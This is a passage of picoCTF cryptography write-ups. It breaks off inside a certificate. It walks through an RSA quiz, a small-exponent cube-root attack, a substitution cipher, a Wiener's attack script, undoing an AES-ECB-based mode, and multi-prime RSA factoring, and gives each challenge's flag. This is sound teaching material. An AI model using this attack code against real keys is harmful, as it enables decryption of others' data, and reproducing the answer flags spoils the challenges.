<p>q = n / p = <code>93089</code></p>
<h2><a class="header" href="#p-q-from-n-e" id="p-q-from-n-e">p, q from n, e</a></h2>
<pre><code>#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
</code></pre>
<p>Not doable on clasical computers</p>
<h2><a class="header" href="#totientn-from-p-q" id="totientn-from-p-q">totient(n) from p, q</a></h2>
<pre><code>#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
</code></pre>
<p>totient(n) = (p-1)(q-1) = <code>836623060</code></p>
<h2><a class="header" href="#c-from-m-e-n" id="c-from-m-e-n">c from m, e, n</a></h2>
<pre><code>#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
</code></pre>
<p>c = m^e mod n = pow(m, e, n) = <code>256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</code></p>
<h2><a class="header" href="#m-from-c-e-n" id="m-from-c-e-n">m from c, e, n</a></h2>
<pre><code>#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre>
<p>Not doable</p>
<pre><code>#### NEW PROBLEM ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### PRODUCE THE FOLLOWING ####
d
</code></pre>
<p>d = modinv(e, phi) = <code>1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</code></p>
<h2><a class="header" href="#m-from-p-c-e-n" id="m-from-p-c-e-n">m from p, c, e, n</a></h2>
<pre><code>#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 11414354166074402755164590556641179510390955987180616313598814488860571850569627408904290135283428920666717612247935936889741174861740224415910111160498656256896678079471373793134970331695671979818719947249086183419374170380011838377712137156655353333603309532154429629316613952073734543526935095731152872812955954824132637944535153824014078120443101933069681669256602347092095050923741698741934906694415931234676691035622479817210233347697548820214251179785631792488566945306938417118918268033241877748155382065658575003275681795893749615704427227208993357057762628133230351866198772974377028377937056546764806501336
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre>
<pre><code class="language-python">&gt;&gt;&gt; p = 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
&gt;&gt;&gt; c = 11414354166074402755164590556641179510390955987180616313598814488860571850569627408904290135283428920666717612247935936889741174861740224415910111160498656256896678079471373793134970331695671979818719947249086183419374170380011838377712137156655353333603309532154429629316613952073734543526935095731152872812955954824132637944535153824014078120443101933069681669256602347092095050923741698741934906694415931234676691035622479817210233347697548820214251179785631792488566945306938417118918268033241877748155382065658575003275681795893749615704427227208993357057762628133230351866198772974377028377937056546764806501336
&gt;&gt;&gt; e = 65537
&gt;&gt;&gt; n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
&gt;&gt;&gt; def xgcd(a, b):
...     &quot;&quot;&quot;return (g, x, y) such that a*x + b*y = g = gcd(a, b)&quot;&quot;&quot;
...     x0, x1, y0, y1 = 0, 1, 1, 0
...     while a != 0:
...         q, b, a = b // a, a, b % a
...         y0, y1 = y1, y0 - q * y1
...         x0, x1 = x1, x0 - q * x1
...     return b, x0, y0
... 
&gt;&gt;&gt; def mulinv(a, b):
...     &quot;&quot;&quot;return x such that (x * a) % b == 1&quot;&quot;&quot;
...     g, x, _ = xgcd(a, b)
...     if g == 1:
...         return x % b
... 
&gt;&gt;&gt; q = n//p
&gt;&gt;&gt; phi = (p-1)*(q-1)
&gt;&gt;&gt; d = mulinv(e, phi)
&gt;&gt;&gt; pow(c, d, n)
14311663942709674867122208214901970650496788151239520971623411712977119700648325685123965309
</code></pre>
<p>This gives a overall answer of</p>
<pre><code>Y
4636878989
Y
93089
N
Y
836623060
Y
256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813
N
Y
1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729
Y
14311663942709674867122208214901970650496788151239520971623411712977119700648325685123965309
</code></pre>
<p>When piped into netcat we get </p>
<pre><code>Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
n: Outstanding move!!!


#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
q: Outstanding move!!!


#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):Outstanding move!!!


#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n): Outstanding move!!!


#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
ciphertext: Outstanding move!!!


#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):Outstanding move!!!


#### NEW PROBLEM ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### PRODUCE THE FOLLOWING ####
d
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
d: Outstanding move!!!


#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 11414354166074402755164590556641179510390955987180616313598814488860571850569627408904290135283428920666717612247935936889741174861740224415910111160498656256896678079471373793134970331695671979818719947249086183419374170380011838377712137156655353333603309532154429629316613952073734543526935095731152872812955954824132637944535153824014078120443101933069681669256602347092095050923741698741934906694415931234676691035622479817210233347697548820214251179785631792488566945306938417118918268033241877748155382065658575003275681795893749615704427227208993357057762628133230351866198772974377028377937056546764806501336
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: Outstanding move!!!


If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)
</code></pre>
<p>flag: <code>picoCTF{wA8_th4t$_ill3aGal..o4d21b3ca}</code></p>
<h1><a class="header" href="#minirsa" id="minirsa">miniRSA</a></h1>
<pre><code>N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c): 2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053
</code></pre>
<p>Because c = m^e mod n, if m^e &lt; n than c = m^e, so m = the eth root of c. All we need is high percision cube root.</p>
<pre><code class="language-python">&gt;&gt;&gt; import decimal
&gt;&gt;&gt; decimal.getcontext().prec = 2000
&gt;&gt;&gt; c = decimal.Decimal('2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053')
&gt;&gt;&gt; c  ** (decimal.Decimal('1') / 3)
Decimal('13016382529449106065894479374027604750406953699090365388202785764091466430362236.999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999976')
&gt;&gt;&gt; hex(13016382529449106065894479374027604750406953699090365388202785764091466430362237)
'0x7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d'
&gt;&gt;&gt; bytearray.fromhex('7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d').decode()
'picoCTF{n33d_a_lArg3r_e_1dcea0a2}'
</code></pre>
<p>flag: <code>picoCTF{n33d_a_lArg3r_e_1dcea0a2}</code></p>
<h1><a class="header" href="#waves-over-lambda" id="waves-over-lambda">waves over lambda</a></h1>
<p>It's a monoalphabetic substitution cypher</p>
<p>cyphertext:</p>
<pre><code>-------------------------------------------------------------------------------
nuxfovke gror qe tubo lsvf - lordbrxnt_qe_n_uwro_svizcv_nqwizrqriw
-------------------------------------------------------------------------------
gvwqxf gvc euir kqir vk it cqehuevs ygrx qx suxcux, q gvc wqeqkrc kgr zoqkqeg iberbi, vxc ivcr ervong viuxf kgr zuupe vxc ivhe qx kgr sqzovot orfvocqxf kovxetswvxqv; qk gvc ekobnp ir kgvk euir luorpxuysrcfr ul kgr nubxkot nubsc gvocst lvqs ku gvwr euir qihuokvxnr qx crvsqxf yqkg v xuzsrivx ul kgvk nubxkot. q lqxc kgvk kgr cqekoqnk gr xvirc qe qx kgr rjkorir rvek ul kgr nubxkot, abek ux kgr zuocroe ul kgorr ekvkre, kovxetswvxqv, iuscvwqv vxc zbpuwqxv, qx kgr iqcek ul kgr nvohvkgqvx iubxkvqxe; uxr ul kgr yqscrek vxc srvek pxuyx huokquxe ul rbouhr. q yve xuk vzsr ku sqfgk ux vxt ivh uo yuop fqwqxf kgr rjvnk sunvsqkt ul kgr nveksr covnbsv, ve kgror vor xu ivhe ul kgqe nubxkot ve trk ku nuihvor yqkg ubo uyx uocxvxnr ebowrt ivhe; zbk q lubxc kgvk zqekoqkm, kgr huek kuyx xvirc zt nubxk covnbsv, qe v lvqost yrss-pxuyx hsvnr. q egvss rxkro gror euir ul it xukre, ve kgrt ivt orloreg it iriuot ygrx q kvsp uwro it kovwrse yqkg iqxv.
</code></pre>
<p>plaintext (<a href="https://www.guballa.de/substitution-solver">from an online solver</a>):</p>
<pre><code>-------------------------------------------------------------------------------
congrats here is your flag - frequency_is_c_over_lambda_civmbeiemv
-------------------------------------------------------------------------------
having had some time at my disposal when in london, i had visited the british museum, and made search among the books and maps in the library regarding transylvania; it had struck me that some foreknowledge of the country could hardly fail to have some importance in dealing with a nobleman of that country. i find that the district he named is in the extreme east of the country, just on the borders of three states, transylvania, moldavia and bukovina, in the midst of the carpathian mountains; one of the wildest and least known portions of europe. i was not able to light on any map or work giving the exact locality of the castle dracula, as there are no maps of this country as yet to compare with our own ordnance survey maps; but i found that bistritz, the post town named by count dracula, is a fairly well-known place. i shall enter here some of my notes, as they may refresh my memory when i talk over my travels with mina.
</code></pre>
<p>flag: <code>picoCTF{frequency_is_c_over_lambda_civmbeiemv}</code></p>
<h1><a class="header" href="#b00tl3grsa2" id="b00tl3grsa2">b00tl3gRSA2</a></h1>
<pre><code>c: 1869936149079364842868711514343199866730632048925134934403014494718295768440412204585415114816078640945932273872053415374485514012744054864473371049894861152575294412432082827337481701337790353590179173939335919939880805493914189463086029606125958708376161813191429889592251081409269870483921858202046282610
n: 68930655074631658214355750702044794004602462708942820914171190783448566020028947004669477972674420580730441187867554277193099323893514265443401167991767624703377288232749335925558702172112529388666961839289542214712576315191538816006934639064639933709368487665249255939916798675632960114307898259079551543019
e: 41363441599707634200466432822059532993866076429415358012902794145912717333257219568375674202837586984121733686242386851079131133722328387278829328983814405964234037343059755907262814784734207526481476056834215399150536398954706809144437661026315908546992120446003550654528573670819776070056315216619572375289
</code></pre>
<p>As e gets biger, d gets smaller, as ed=1 mod n. </p>
<p>Therfor we are vunerable to <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener's attack</a>. Someone has already writen <a href="https://github.com/orisano/owiener/blob/master/owiener.py">the code</a> for this. After some lite mods, we get</p>
<pre><code class="language-python">def isqrt(n):
    if n == 0:
        return 0
    x = 2 ** ((n.bit_length() + 1) // 2)
    while True:
        y = (x + n // x) // 2
        if y &gt;= x:
            return x
        x = y

def is_perfect_square(n):
    sq_mod256 = (1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0)
    if sq_mod256[n &amp; 0xff] == 0:
        return False
    mt = (
        (9, (1,1,0,0,1,0,0,1,0)),
        (5, (1,1,0,0,1)),
        (7, (1,1,1,0,1,0,0)),
        (13, (1,1,0,1,1,0,0,0,0,1,1,0,1)),
        (17, (1,1,1,0,1,0,0,0,1,1,0,0,0,1,0,1,1))
    )
    a = n % (9 * 5 * 7 * 13 * 17)
    if any(t[a % m] == 0 for m, t in mt):
        return False
    return isqrt(n) ** 2 == n

def rational_to_contfrac(x, y):
    while y:
        a = x // y
        yield a
        x, y = y, x - a * y

def contfrac_to_rational_iter(contfrac):
    n0, d0 = 0, 1
    n1, d1 = 1, 0
    for q in contfrac:
        n = q * n1 + n0
        d = q * d1 + d0
        yield n, d
        n0, d0 = n1, d1
        n1, d1 = n, d

def convergents_from_contfrac(contfrac):
    n_, d_ = 1, 0
    for i, (n, d) in enumerate(contfrac_to_rational_iter(contfrac)):
        if i % 2 == 0:
            yield n + n_, d + d_
        else:
            yield n, d
        n_, d_ = n, d

def attack(e, n):
    f_ = rational_to_contfrac(e, n)
    for k, dg in convergents_from_contfrac(f_):
        edg = e * dg
        phi = edg // k
        x = n - phi + 1
        if x % 2 == 0 and is_perfect_square((x // 2) ** 2 - n):
            g = edg - phi * k
            return dg // g
    return None

e = 41363441599707634200466432822059532993866076429415358012902794145912717333257219568375674202837586984121733686242386851079131133722328387278829328983814405964234037343059755907262814784734207526481476056834215399150536398954706809144437661026315908546992120446003550654528573670819776070056315216619572375289
n=68930655074631658214355750702044794004602462708942820914171190783448566020028947004669477972674420580730441187867554277193099323893514265443401167991767624703377288232749335925558702172112529388666961839289542214712576315191538816006934639064639933709368487665249255939916798675632960114307898259079551543019
d=attack(e, n)
c=1869936149079364842868711514343199866730632048925134934403014494718295768440412204585415114816078640945932273872053415374485514012744054864473371049894861152575294412432082827337481701337790353590179173939335919939880805493914189463086029606125958708376161813191429889592251081409269870483921858202046282610
m=pow(c,d,n)
print(m.to_bytes(m.bit_length(), byteorder='big'))
</code></pre>
<p>flag: <code>picoCTF{bad_1d3a5_4986370}</code></p>
<h1><a class="header" href="#aes-abc" id="aes-abc">AES-ABC</a></h1>
<p><code>ECB</code> is realy bad, as the same block will always be encrypted the same way. In images, this manifests itself in the image still being recognisable.
<img src="https://i.stack.imgur.com/bXAUL.png" alt="" />
Therefor if we just undo the ABC, we should be able to squint hard enought to see the origional.</p>
<p><img src="cryptography/12-AES-ABC/./body.png" alt="" /></p>
<p>This is helped by the fact in the origional image, much of the outside looks sililar. Therefor we can guess this will be a background, whereas the more chaotic bit in the midddle will have the flag.</p>
<p>Now we can look more closely at the encryption</p>
<pre><code class="language-python">def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = &quot;&quot;.join(blocks)
 
    return iv, ct_abc, ct
</code></pre>
<p>Looking at this we can say that</p>
<pre><code>abc[0] = iv
abc[n+1] = ebc[n] + abc[n] % UMAX
</code></pre>
<p>The secound can be rewritten as</p>
<pre><code>ebc[n] + abc[n] = k*UMAX + abc[n+1]
</code></pre>
<p>where k is a non-negative integer. Therefor</p>
<pre><code>ebc[n] = abc[n+1] - abc[n] + k*UMAX
</code></pre>
<p>Because <code>UMAX</code> must fit within a block, so it must be greater than  <code>ebc[n]</code> and <code>abc[n+1]</code>. Therefor the range of <code>abc[n+1] - abc[n]</code> is less than <code>UMAX</code> so their can only be one value 
of <code>k</code> that makes <code>ebc[n]</code> in a valid range</p>
<p>Therefor we can trivialy find k and undo the ABC layer</p>
<pre><code class="language-python">import math
BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))
def to_bytes(n):
    s = hex(n)
    s_n = s[2:]
    if 'L' in s_n:
        s_n = s_n.replace('L', '')
    if len(s_n) % 2 != 0:
        s_n = '0' + s_n
    decoded = s_n.decode('hex')
    pad = (len(decoded) % BLOCK_SIZE)
    if pad != 0: 
        decoded = &quot;\0&quot; * (BLOCK_SIZE - pad) + decoded
    return decoded

def remove_line(s):
    return s[:s.index('\n') + 1], s[s.index('\n')+1:]

def parse_header_ppm(f):
    data = f.read()
    header = &quot;&quot;
    for i in range(3):
        header_i, data = remove_line(data)
        header += header_i
    return header, data

with open('body.enc.ppm', 'rb') as cf:
    hed, dat = parse_header_ppm(cf)

cb = [dat[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(dat) / BLOCK_SIZE)]
mb = []
for i in range(len(cb) - 1):
    abc_n = int(cb[i].encode('hex'), 16)
    abc_n_plus_1 = int(cb[i+1].encode('hex'), 16)
    delta = abc_n_plus_1 - abc_n
    while delta &lt; 0:
        delta += UMAX
    mb.append(to_bytes(delta))

with open('flag.ppm', 'wb') as mf:
    mf.write(hed)
    mf.write(&quot;&quot;.join(mb))
</code></pre>
<p>Some notes:</p>
<ul>
<li>We use python2, because I the pico code is written in it, and I want to reuse their code</li>
<li>We reuse some code from the encryption </li>
</ul>
<p>This will output a new <code>ppm</code> image, which has the flag</p>
<p><img src="cryptography/12-AES-ABC/./flag.png" alt="" /></p>
<p>flag: <code>picoCTF{d0Nt_r0ll_yoUr_0wN_aES}</code></p>
<h1><a class="header" href="#b00tl3grsa3" id="b00tl3grsa3">b00tl3gRSA3</a></h1>
<pre><code>c: 3999536765627381160274621433819499659220280848614614626267785227274489813626301692309010456669080286690008335802072858430583432014331019800111258253681285465798629231928511095462828910257259504661052477970000645353687663502028921708592863763205928074817197804052516122151094566106370108011192020137339812945139800771841958975495160250036273713
n: 6236396798466314286230379068647783642225003493957655317532411306908453482900079156118698557730540515267091273287375485452431299856933461268945601892810009449408899899778339409761350850656888690226070613923332261553137293345356407750973610411990720065223462205733871872832535380156089697089561103707659296909952092669887240116412881244308365331
e: 65537
</code></pre>
<p>when <code>n = p * q * r</code>, <code>phi = (p-1)(q-1)(r-1)</code>. <a href="https://www.alpertron.com.ar/ECM.HTM">This website</a> will find the factors and report the totient (phi).</p>
<pre><code class="language-python">phi = 6236396780574963961406945418196114868799540088135425314149693861958890127953938472724682301326863995207243531148332329223564041449602049216069521823948237198233791172710470823378068073022613286378127711814119028217481997251271903097711574201768617756858524997524905427565695973165883233760737492587399148637091017232851223571333120000000000000
c=3999536765627381160274621433819499659220280848614614626267785227274489813626301692309010456669080286690008335802072858430583432014331019800111258253681285465798629231928511095462828910257259504661052477970000645353687663502028921708592863763205928074817197804052516122151094566106370108011192020137339812945139800771841958975495160250036273713
n=6236396798466314286230379068647783642225003493957655317532411306908453482900079156118698557730540515267091273287375485452431299856933461268945601892810009449408899899778339409761350850656888690226070613923332261553137293345356407750973610411990720065223462205733871872832535380156089697089561103707659296909952092669887240116412881244308365331
e=65537
def xgcd(a, b):
    &quot;&quot;&quot;return (g, x, y) such that a*x + b*y = g = gcd(a, b)&quot;&quot;&quot;
    x0, x1, y0, y1 = 0, 1, 1, 0
    while a != 0:
        q, b, a = b // a, a, b % a
        y0, y1 = y1, y0 - q * y1
        x0, x1 = x1, x0 - q * x1
    return b, x0, y0

def mulinv(a, b):
    &quot;&quot;&quot;return x such that (x * a) % b == 1&quot;&quot;&quot;
    g, x, _ = xgcd(a, b)
    if g == 1:
        return x % b

d = mulinv(e, phi)
m = pow(c, d, n)
print(m.to_bytes(m.bit_length(), 'big').replace(b'\x00', b''))
</code></pre>
<p>flag: <code>picoCTF{too_many_fact0rs_8024768}</code></p>
<h1><a class="header" href="#john_pollard" id="john_pollard">john_pollard</a></h1>
<pre><code>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
